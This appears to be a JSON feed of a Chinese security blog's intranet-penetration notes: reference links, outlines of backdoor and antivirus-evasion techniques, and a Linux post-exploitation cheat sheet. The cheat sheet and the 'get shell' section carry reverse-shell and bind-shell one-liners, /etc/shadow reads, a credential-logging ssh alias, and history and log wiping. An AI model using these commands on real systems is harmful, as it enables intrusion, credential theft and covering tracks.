{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"内网渗透\" category",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/",
            "title": "参考文档",
            "date_published": "2022-11-29T08:03:20.000Z",
            "content_html": "<h1 id=\"windows\"><a class=\"anchor\" href=\"#windows\">#</a> Windows</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy9zZWN1cml0eS90aHJlYXQtcHJvdGVjdGlvbi8=\">Windows 威胁防护</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naDBzdC5jbi9hcmNoaXZlcy8yMDE3LTAzLTI5LzE=\">文件寄生 NTFS 文件流实际应用</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ2MQ==\">Windows 中常见后门持久化方法总结</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8vIw==\">LOLBAS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly8zZ3N0dWRlbnQuZ2l0aHViLmlvLzNnc3R1ZGVudC5naXRodWIuaW8vJUU2JUI4JTk3JUU5JTgwJThGJUU2JThBJTgwJUU1JUI3JUE3LVdpbmRvd3MlRTUlOEQlOTUlRTYlOUQlQTElRTYlOTclQTUlRTUlQkYlOTclRTclOUElODQlRTUlODglQTAlRTklOTklQTQv\">渗透技巧 ——Windows 单条日志的删除</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzE1NQ==\">windows 取证 文件执行记录的获取和清除</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGFya29wZXJhdG9yLmNvbS9ibG9nLzIwMjAvMS8xNC9nZXR0aW5nLWRucy1jbGllbnQtY2FjaGVkLWVudHJpZXMtd2l0aC1jaW13bWk=\">Getting DNS Client Cached Entries with CIM/WMI</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZW5namliby5naXRodWIuaW8vUGVyc2lzdGVuY2Uv\">Windows 单机 Persistence</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAyMS8wNS8yNC9kdW1waW5nLXJkcC1jcmVkZW50aWFscy8=\">Dumping RDP Credentials</span></li>\n</ul>\n<h2 id=\"域渗透\"><a class=\"anchor\" href=\"#域渗透\">#</a> 域渗透</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvMjUxMC5odG1s\">绕过域账户登录失败次数的限制</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpnM056RTVPVEE1TlE9PSZhbXA7bWlkPTIyNDc0ODM4MDcmYW1wO2lkeD0xJmFtcDtzbj01OWJlNTBhYTVjYzczNWYwNTVkYjU5NjI2OWE4NTdjZQ==\">域渗透总结</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BhZGFtLnRvc2NoZXIvdG9wLWZpdmUtd2F5cy1pLWdvdC1kb21haW4tYWRtaW4tb24teW91ci1pbnRlcm5hbC1uZXR3b3JrLWJlZm9yZS1sdW5jaC0yMDE4LWVkaXRpb24tODIyNTlhYjczYWFh\">got domain admin on internal network</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Rvd25sb2FkLm1pY3Jvc29mdC5jb20vZG93bmxvYWQvNy83L0EvNzdBQkM1QkQtODMyMC00MUFGLTg2M0MtNkVDRkIxMENCNEI5L01pdGlnYXRpbmclMjBQYXNzLXRoZS1IYXNoJTIwKFB0SCklMjBBdHRhY2tzJTIwYW5kJTIwT3RoZXIlMjBDcmVkZW50aWFsJTIwVGhlZnQlMjBUZWNobmlxdWVzX0VuZ2xpc2gucGRm\">Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft Techniques</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL0FjdGl2ZS1EaXJlY3RvcnktUGVudGVzdC1Ob3Rlcw==\">域渗透学习笔记</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9xb21wbHguY29tL3FvbXBseC1rbm93bGVkZ2UtZnVuZGFtZW50YWxzLW9mLWFjdGl2ZS1kaXJlY3RvcnktdHJ1c3QtcmVsYXRpb25zaGlwcy8=\">QOMPLX Knowledge: Fundamentals of Active Directory Trust Relationships</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC84MTI3ODY4Lmh0bWw=\">Kerberos 的黄金票据详解</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFsc2lkLmV1L2Rjc2hhZG93LWV4cGxhaW5lZC00NTEwZjUyZmMxOWQ=\">DCShadow explained: A technical deep dive into the latest AD attack technique</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8=\">Active Directory Security</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnhwbnNlYy5jb20va2VyYmVyb3MtYXR0YWNrcy1wYXJ0LTEv\">Kerberos AD Attacks Kerberoasting</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzUxNw==\">Kerberos 之域内委派攻击</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NmYWx0YS9hZHNlYw==\">adsec</span> An introduction to Active Directory security</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96ZXIxdDAuZ2l0bGFiLmlvL3Bvc3RzL2F0dGFja2luZ19hZC8=\">Attacking Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3BlY3Rlcm9wcy5pby9hc3NldHMvcmVzb3VyY2VzL0NlcnRpZmllZF9QcmUtT3duZWQucGRm\">Certified Pre-Owned Abusing Active Directory Certificate Services</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vYWR2YW5jZWQtdGhyZWF0LWFuYWx5dGljcy93aGF0LWlzLWF0YQ==\">Microsoft Advanced Threat Analytics</span></li>\n</ul>\n<h2 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzExNDczMS5odG1s\">Windows 内网渗透提权</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hmaXJlZjB4L1VBQ01F\">UACMe</span> Defeating Windows User Account Control</li>\n</ul>\n<h2 id=\"协议\"><a class=\"anchor\" href=\"#协议\">#</a> 协议</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RjZXJwYy9kY2VycGM=\">DEC/RPC</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWRjYW5hcnkuY29tL2Jsb2cvbXNycGMtdG8tYXR0YWNrLw==\">The dark side of Microsoft Remote Procedure Call protocols</span></li>\n</ul>\n<h1 id=\"redteam\"><a class=\"anchor\" href=\"#redteam\">#</a> RedTeam</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tsaW9uc2VjL1JlZFRlYW1NYW51YWw=\">RedTeamManual</span></li>\n</ul>\n<h1 id=\"内网\"><a class=\"anchor\" href=\"#内网\">#</a> 内网</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjM1NA==\">内网安全检查</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvOTI2NDY=\">我所知道的内网渗透</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2wzbTBuL3BlbnRlc3Rfc3R1ZHk=\">从零开始内网渗透学习</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTY0OS8=\">渗透技巧 从 Github 下载安装文件</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vZmZzZWMucHJvdmFkeXMuY29tL2ludHJvLXRvLWZpbGUtb3BlcmF0aW9uLWFidXNlLW9uLVdpbmRvd3MuaHRtbA==\">An introduction to privileged file operation abuse on Windows</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNDUyMg==\">脚本维权 tips</span></li>\n</ul>\n<h1 id=\"cobalt-strike\"><a class=\"anchor\" href=\"#cobalt-strike\">#</a> Cobalt Strike</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cubGVhbm90ZS5jb20vcG9zdC9zbm93bWluZy9Db2JhbHQtU3RyaWtl\">Cobalt Strike 系列笔记</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNDE5MQ==\">渗透利器 Cobalt Strike 第 2 篇 APT 级的全面免杀与企业纵深防御体系的对抗</span></li>\n</ul>\n",
            "tags": [
                "内网"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/",
            "title": "综合技巧",
            "date_published": "2022-11-29T07:50:20.000Z",
            "content_html": "<h1 id=\"端口转发\"><a class=\"anchor\" href=\"#端口转发\">#</a> 端口转发</h1>\n<ul>\n<li>\n<p>windows</p>\n<ul>\n<li>lcx</li>\n<li>netsh</li>\n</ul>\n</li>\n<li>\n<p>linux</p>\n<ul>\n<li>portmap</li>\n<li>iptables</li>\n</ul>\n</li>\n<li>\n<p>socket 代理</p>\n<ul>\n<li>Win: xsocks</li>\n<li>Linux: proxychains</li>\n</ul>\n</li>\n<li>\n<p>基于 http 的转发与 socket 代理 (低权限下的渗透)</p>\n<ul>\n<li>端口转发: tunnasocks 代理: reGeorg</li>\n</ul>\n</li>\n<li>\n<p>ssh 通道</p>\n<ul>\n<li>端口转发 socks</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"获取shell\"><a class=\"anchor\" href=\"#获取shell\">#</a> 获取 shell</h1>\n<ul>\n<li>常规 shell 反弹</li>\n</ul>\n<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\n</code></pre>\n<ul>\n<li>突破防火墙的 imcp_shell 反弹</li>\n<li>正向 shell</li>\n</ul>\n<pre><code>nc -e /bin/sh -lp 1234\nnc.exe -e cmd.exe -lp 1234\n</code></pre>\n<h1 id=\"内网文件传输\"><a class=\"anchor\" href=\"#内网文件传输\">#</a> 内网文件传输</h1>\n<ul>\n<li>\n<p>windows 下文件传输</p>\n<ul>\n<li>powershell</li>\n<li>vbs 脚本文件</li>\n<li>bitsadmin</li>\n<li>文件共享</li>\n<li>使用 telnet 接收数据</li>\n<li>hta</li>\n</ul>\n</li>\n<li>\n<p>linux 下文件传输</p>\n<ul>\n<li>python</li>\n<li>wget</li>\n<li>tar + ssh</li>\n<li>利用 dns 传输数据</li>\n</ul>\n</li>\n<li>\n<p>文件编译</p>\n<ul>\n<li>powershell 将 exe 转为 txt，再 txt 转为 exe</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"远程连接-执行程序\"><a class=\"anchor\" href=\"#远程连接-执行程序\">#</a> 远程连接 &amp;&amp; 执行程序</h1>\n<ul>\n<li>at&amp;schtasks</li>\n<li>psexec</li>\n<li>wmic</li>\n<li>wmiexec.vbs</li>\n<li>smbexec</li>\n<li>powershell remoting</li>\n<li>SC 创建服务执行</li>\n<li>schtasks</li>\n<li>SMB+MOF || DLL Hijacks</li>\n<li>PTH + compmgmt.msc</li>\n</ul>\n",
            "tags": [
                "代理",
                "Shell",
                "远程连接"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/",
            "title": "后门技术",
            "date_published": "2022-11-29T07:45:20.000Z",
            "content_html": "<h1 id=\"开发技术\"><a class=\"anchor\" href=\"#开发技术\">#</a> 开发技术</h1>\n<ul>\n<li>\n<p>管控功能实现技术</p>\n<ul>\n<li>系统管理：查看系统基本信息，进程管理，服务管理</li>\n<li>文件管理：复制 / 粘贴文件，删除文件 / 目录，下载 / 上传文件等</li>\n<li>Shell 管理</li>\n<li>击键记录监控</li>\n<li>屏幕截取</li>\n<li>音频监控</li>\n<li>视频监控</li>\n<li>隐秘信息查看</li>\n<li>移动磁盘的动态监控</li>\n<li>远程卸载</li>\n</ul>\n</li>\n<li>\n<p>自启动技术</p>\n<ul>\n<li>Windows 自启动\n<ul>\n<li>基于 Windows 启动目录的自启动</li>\n<li>基于注册表的自启动</li>\n<li>基于服务程序的自启动</li>\n<li>基于 ActiveX 控件的自启动</li>\n<li>基于计划任务（Scheduled Tasks）的自启动</li>\n</ul>\n</li>\n<li>Linux 自启动</li>\n</ul>\n</li>\n<li>\n<p>用户态进程隐藏技术</p>\n<ul>\n<li>基于 DLL 插入的进程隐藏\n<ul>\n<li>远程线程创建技术</li>\n<li>设置窗口挂钩（HOOK）技术</li>\n</ul>\n</li>\n<li>基于 SvcHost 共享服务的进程隐藏</li>\n<li>进程内存替换</li>\n</ul>\n</li>\n<li>\n<p>数据穿透和躲避技术</p>\n<ul>\n<li>反弹端口</li>\n<li>协议隧道\n<ul>\n<li>HTTP</li>\n<li>MSN</li>\n<li>Google Talk</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>内核级隐藏技术（Rootkit）</p>\n</li>\n<li>\n<p>磁盘启动级隐藏技术（Bootkit）</p>\n<ul>\n<li>MBR</li>\n<li>BIOS</li>\n<li>NTLDR</li>\n<li>boot.ini</li>\n</ul>\n</li>\n<li>\n<p>还原软件对抗技术</p>\n</li>\n</ul>\n<h1 id=\"后门免杀\"><a class=\"anchor\" href=\"#后门免杀\">#</a> 后门免杀</h1>\n<ul>\n<li>\n<p>传统静态代码检测</p>\n<ul>\n<li>加壳</li>\n<li>添加花指令</li>\n<li>输入表免杀</li>\n</ul>\n</li>\n<li>\n<p>启发式代码检测</p>\n<ul>\n<li>动态函数调用</li>\n</ul>\n</li>\n<li>\n<p>云查杀</p>\n<ul>\n<li>动态增大自身体积</li>\n<li>更改云查杀服务器域名解析地址</li>\n<li>断网</li>\n<li>利用散列碰撞绕过云端 “白名单”</li>\n</ul>\n</li>\n<li>\n<p>攻击主防杀毒软件</p>\n<ul>\n<li>更改系统时间</li>\n<li>窗口消息攻击</li>\n<li>主动发送 IRP 操纵主防驱动</li>\n</ul>\n</li>\n<li>\n<p>利用证书信任</p>\n<ul>\n<li>盗取利用合法证书</li>\n<li>利用散列碰撞伪造证书</li>\n<li>利用合法程序 DLL 劫持问题的 “白加黑”</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"检测技术\"><a class=\"anchor\" href=\"#检测技术\">#</a> 检测技术</h1>\n<ul>\n<li>基于自启动信息的检测</li>\n<li>基于进程信息的检测</li>\n<li>基于数据传输的检测</li>\n<li>Rootkit/Bootkit 的检测</li>\n</ul>\n<h1 id=\"后门分析\"><a class=\"anchor\" href=\"#后门分析\">#</a> 后门分析</h1>\n<ul>\n<li>\n<p>动态分析</p>\n</li>\n<li>\n<p>静态分析</p>\n<ul>\n<li>反病毒引擎扫描</li>\n<li>文件格式识别</li>\n<li>文件加壳识别及脱壳</li>\n<li>明文字符串查找</li>\n<li>链接库及导入 / 导出函数分析</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "后门",
                "渗透",
                "免杀"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/",
            "title": "Linux内网渗透",
            "date_published": "2022-11-28T13:35:20.000Z",
            "content_html": "<h1 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h1>\n<h2 id=\"获取内核操作系统和设备信息\"><a class=\"anchor\" href=\"#获取内核操作系统和设备信息\">#</a> 获取内核，操作系统和设备信息</h2>\n<ul>\n<li>\n<p>版本信息</p>\n<ul>\n<li><code>uname -a</code>  所有版本</li>\n<li><code>uname -r</code>  内核版本信息</li>\n<li><code>uname -n</code>  系统主机名字</li>\n<li><code>uname -m</code>  Linux 内核架构</li>\n</ul>\n</li>\n<li>\n<p>内核信息  <code>cat /proc/version</code></p>\n</li>\n<li>\n<p>CPU 信息  <code>cat /proc/cpuinfo</code></p>\n</li>\n<li>\n<p>发布信息</p>\n<ul>\n<li><code>cat /etc/*-release</code></li>\n<li><code>cat /etc/issue</code></li>\n</ul>\n</li>\n<li>\n<p>主机名  <code>hostname</code></p>\n</li>\n<li>\n<p>文件系统  <code>df -a</code></p>\n</li>\n<li>\n<p>内核日志  <code>dmesg</code>  /  <code>/var/log/dmesg</code></p>\n</li>\n</ul>\n<h2 id=\"用户和组\"><a class=\"anchor\" href=\"#用户和组\">#</a> 用户和组</h2>\n<ul>\n<li>\n<p>列出系统所有用户  <code>cat /etc/passwd</code></p>\n</li>\n<li>\n<p>列出系统所有组  <code>cat /etc/group</code></p>\n</li>\n<li>\n<p>列出所有用户 hash（root） <code>cat /etc/shadow</code></p>\n</li>\n<li>\n<p>用户</p>\n<ul>\n<li>查询用户的基本信息  <code>finger</code></li>\n<li>当前登录的用户  <code>users</code>   <code>who -a</code>   <code>/var/log/utmp</code></li>\n<li>查询无密码用户  <code>grep 'x:0:' /etc/passwd</code></li>\n</ul>\n</li>\n<li>\n<p>目前登录的用户  <code>w</code></p>\n</li>\n<li>\n<p>登入过的用户信息  <code>last</code>  /  <code>/var/log/wtmp</code></p>\n</li>\n<li>\n<p>显示系统中所有用户最近一次登录信息  <code>lastlog</code>  /  <code>/var/log/lastlog</code></p>\n</li>\n<li>\n<p>登录成功日志  <code>/var/log/secure</code></p>\n</li>\n<li>\n<p>登录失败日志  <code>/var/log/faillog</code></p>\n</li>\n<li>\n<p>查看特权用户  <code>grep :0 /etc/passwd</code></p>\n</li>\n<li>\n<p>查看 passwd 最后修改时间  <code>ls -l /etc/passwd</code></p>\n</li>\n<li>\n<p>查看是否存在空口令用户  <code>awk -F: 'length($2)==0 &#123;print $1&#125;' /etc/shadow</code></p>\n</li>\n<li>\n<p>查看远程登录的账号  <code>awk '/\\$1|\\$6/&#123;print $1&#125;' /etc/shadow</code></p>\n</li>\n<li>\n<p>查看具有 sudo 权限的用户</p>\n<ul>\n<li><code>cat /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"用户和权限信息\"><a class=\"anchor\" href=\"#用户和权限信息\">#</a> 用户和权限信息</h2>\n<ul>\n<li>当前用户  <code>whoami</code></li>\n<li>当前用户信息  <code>id</code></li>\n<li>可以使用 sudo 提升到 root 的用户（root）  <code>cat /etc/sudoers</code></li>\n<li>列出目前用户可执行与无法执行的指令  <code>sudo -l</code></li>\n</ul>\n<h2 id=\"环境信息\"><a class=\"anchor\" href=\"#环境信息\">#</a> 环境信息</h2>\n<ul>\n<li>打印系统环境信息  <code>env</code></li>\n<li>打印系统环境信息  <code>set</code></li>\n<li>环境变量中的路径信息  <code>echo $PATH</code></li>\n<li>打印历史命令  <code>history</code>  /  <code>~/.bash_history</code></li>\n<li>显示当前路径  <code>pwd</code></li>\n<li>显示默认系统遍历  <code>cat /etc/profile</code></li>\n<li>显示可用的 shell  <code>cat /etc/shells</code></li>\n</ul>\n<h2 id=\"进程信息\"><a class=\"anchor\" href=\"#进程信息\">#</a> 进程信息</h2>\n<ul>\n<li>查看进程信息  <code>ps aux</code></li>\n<li>资源占有情况  <code>top -c</code></li>\n<li>查看进程关联文件  <code>lsof -c $PID</code></li>\n<li>完整命令行信息  <code>/proc/$PID/cmdline</code></li>\n<li>进程的命令名  <code>/proc/$PID/comm</code></li>\n<li>进程当前工作目录的符号链接  <code>/proc/$PID/cwd</code></li>\n<li>运行程序的符号链接  <code>/proc/$PID/exe</code></li>\n<li>进程的环境变量  <code>/proc/$PID/environ</code></li>\n<li>进程打开文件的情况  <code>/proc/$PID/fd</code></li>\n</ul>\n<h2 id=\"服务信息\"><a class=\"anchor\" href=\"#服务信息\">#</a> 服务信息</h2>\n<ul>\n<li>由 inetd 管理的服务列表  <code>cat /etc/inetd.conf</code></li>\n<li>由 xinetd 管理的服务列表  <code>cat /etc/xinetd.conf</code></li>\n<li>nfs 服务器的配置  <code>cat /etc/exports</code></li>\n<li>邮件信息  <code>/var/log/mailog</code></li>\n<li>ssh 配置  <code>sshd_config</code></li>\n</ul>\n<h2 id=\"计划任务\"><a class=\"anchor\" href=\"#计划任务\">#</a> 计划任务</h2>\n<ul>\n<li>显示指定用户的计划作业（root）  <code>crontab -l -u %user%</code></li>\n<li>计划任务\n<ul>\n<li><code>/var/spool/cron/*</code></li>\n<li><code>/var/spool/anacron/*</code></li>\n<li><code>/etc/crontab</code></li>\n<li><code>/etc/anacrontab</code></li>\n<li><code>/etc/cron.*</code></li>\n<li><code>/etc/anacrontab</code></li>\n</ul>\n</li>\n<li>开机启动项\n<ul>\n<li><code>/etc/rc.d/init.d/</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"网络-路由和通信\"><a class=\"anchor\" href=\"#网络-路由和通信\">#</a> 网络、路由和通信</h2>\n<ul>\n<li>列出网络接口信息  <code>/sbin/ifconfig -a</code>  /  <code>ip addr show</code></li>\n<li>列出网络接口信息  <code>cat /etc/network/interfaces</code></li>\n<li>查看系统 arp 表  <code>arp -a</code></li>\n<li>打印路由信息  <code>route</code>  /  <code>ip ro show</code></li>\n<li>查看 dns 配置信息  <code>cat /etc/resolv.conf</code></li>\n<li>打印本地端口开放信息  <code>netstat -an</code></li>\n<li>列出 iptable 的配置规则  <code>iptables -L</code></li>\n<li>查看端口服务映射  <code>cat /etc/services</code></li>\n<li>Hostname  <code>hostname -f</code></li>\n<li>查看进程端口情况  <code>netstat -anltp | grep $PID</code></li>\n</ul>\n<h2 id=\"已安装程序\"><a class=\"anchor\" href=\"#已安装程序\">#</a> 已安装程序</h2>\n<ul>\n<li><code>rpm -qa --last</code>  Redhat</li>\n<li><code>yum list | grep installed</code>  CentOS</li>\n<li><code>ls -l /etc/yum.repos.d/</code></li>\n<li><code>dpkg -l</code>  Debian</li>\n<li><code>cat /etc/apt/sources.list</code>  Debian APT</li>\n<li><code>pkg_info</code>  xBSD</li>\n<li><code>pkginfo</code>  Solaris</li>\n<li><code>pacman -Q</code>  Arch Linux</li>\n<li><code>emerge</code>  Gentoo</li>\n</ul>\n<h2 id=\"文件\"><a class=\"anchor\" href=\"#文件\">#</a> 文件</h2>\n<ul>\n<li>最近五天的文件  <code>find / -ctime +1 -ctime -5</code></li>\n<li>文件系统细节  <code>debugfs</code></li>\n</ul>\n<h2 id=\"公私钥信息\"><a class=\"anchor\" href=\"#公私钥信息\">#</a> 公私钥信息</h2>\n<ul>\n<li><code>~/.ssh</code></li>\n<li><code>/etc/ssh</code></li>\n</ul>\n<h2 id=\"日志\"><a class=\"anchor\" href=\"#日志\">#</a> 日志</h2>\n<ul>\n<li><code>/var/log/boot.log</code></li>\n<li><code>/var/log/cron</code></li>\n<li><code>/var/log/faillog</code></li>\n<li><code>/var/log/lastlog</code></li>\n<li><code>/var/log/messages</code></li>\n<li><code>/var/log/secure</code></li>\n<li><code>/var/log/syslog</code></li>\n<li><code>/var/log/syslog</code></li>\n<li><code>/var/log/wtmp</code></li>\n<li><code>/var/log/wtmp</code></li>\n<li><code>/var/run/utmp</code></li>\n</ul>\n<h2 id=\"虚拟环境检测\"><a class=\"anchor\" href=\"#虚拟环境检测\">#</a> 虚拟环境检测</h2>\n<ul>\n<li><code>lsmod | grep -i &quot;vboxsf\\|vboxguest&quot;</code></li>\n<li><code>lsmod | grep -i &quot;vmw_baloon\\|vmxnet&quot;</code></li>\n<li><code>lsmod | grep -i &quot;xen-vbd\\|xen-vnif&quot;</code></li>\n<li><code>lsmod | grep -i &quot;virtio_pci\\|virtio_net&quot;</code></li>\n<li><code>lsmod | grep -i &quot;hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc&quot;</code></li>\n</ul>\n<h2 id=\"容器内信息收集\"><a class=\"anchor\" href=\"#容器内信息收集\">#</a> 容器内信息收集</h2>\n<ul>\n<li><code>capsh --print</code></li>\n<li><code>cat /proc/1/cgroup</code></li>\n<li><code>env | grep KUBE</code></li>\n<li><code>ls -l .dockerenv</code></li>\n<li><code>ls -l /run/secrets/Kubernetes.io/</code></li>\n<li><code>mount</code></li>\n<li><code>ps aux</code></li>\n</ul>\n<h1 id=\"持久化\"><a class=\"anchor\" href=\"#持久化\">#</a> 持久化</h1>\n<h2 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h2>\n<ul>\n<li>内核漏洞利用</li>\n<li>攻击有 root 权限的服务</li>\n<li>利用第三方服务提权</li>\n<li>通过有 SUID 属性的可执行文件\n<ul>\n<li>查找可能提权的可执行文件</li>\n<li><code>find / -perm +4000 -ls</code></li>\n<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>\n<li><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></li>\n<li><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 2&gt;/dev/null</code></li>\n</ul>\n</li>\n<li>利用可用的 root 权限\n<ul>\n<li><code>sudo -l</code></li>\n</ul>\n</li>\n<li>利用误配置的 crontab 任务</li>\n</ul>\n<h2 id=\"自启动\"><a class=\"anchor\" href=\"#自启动\">#</a> 自启动</h2>\n<ul>\n<li>/etc/init.d</li>\n<li>/etc/rc.d/rc.local</li>\n<li>~/.bashrc</li>\n<li>~/.zshrc</li>\n</ul>\n<h2 id=\"后门\"><a class=\"anchor\" href=\"#后门\">#</a> 后门</h2>\n<ul>\n<li>ssh 后门\n<ul>\n<li><code>alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'</code></li>\n<li>后门账户</li>\n</ul>\n</li>\n<li>常见应用\n<ul>\n<li>ICMP</li>\n<li>DNS</li>\n</ul>\n</li>\n<li>icmp 后门</li>\n<li>后门端口复用</li>\n<li><code>.</code>  开头隐藏文件</li>\n<li>rootkit</li>\n</ul>\n<h1 id=\"痕迹清理\"><a class=\"anchor\" href=\"#痕迹清理\">#</a> 痕迹清理</h1>\n<h2 id=\"历史命令\"><a class=\"anchor\" href=\"#历史命令\">#</a> 历史命令</h2>\n<ul>\n<li><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;</code></li>\n<li><code>kill -9 $$</code>  kill history</li>\n<li><code>history -c</code></li>\n<li>在  <code>HISTSIZE=0</code>  中设置  <code>HISTSIZE=0</code></li>\n</ul>\n<h2 id=\"清除修改日志文件\"><a class=\"anchor\" href=\"#清除修改日志文件\">#</a> 清除 / 修改日志文件</h2>\n<ul>\n<li><code>/var/log/btmp</code></li>\n<li><code>/var/log/lastlog</code></li>\n<li><code>/var/log/wtmp</code></li>\n<li><code>/var/log/utmp</code></li>\n<li><code>/var/log/secure</code></li>\n<li><code>/var/log/message</code></li>\n</ul>\n<h2 id=\"登录痕迹\"><a class=\"anchor\" href=\"#登录痕迹\">#</a> 登录痕迹</h2>\n<ul>\n<li>删除  <code>~/.ssh/known_hosts</code>  中记录</li>\n<li>修改文件时间戳\n<ul>\n<li><code>touch –r</code></li>\n</ul>\n</li>\n<li>删除 tmp 目录临时文件</li>\n</ul>\n<h2 id=\"操作痕迹\"><a class=\"anchor\" href=\"#操作痕迹\">#</a> 操作痕迹</h2>\n<ul>\n<li>vim 不记录历史命令  <code>:set history=0</code></li>\n<li>ssh 登录痕迹\n<ul>\n<li>无痕登录  <code>ssh -T user@host /bin/bash 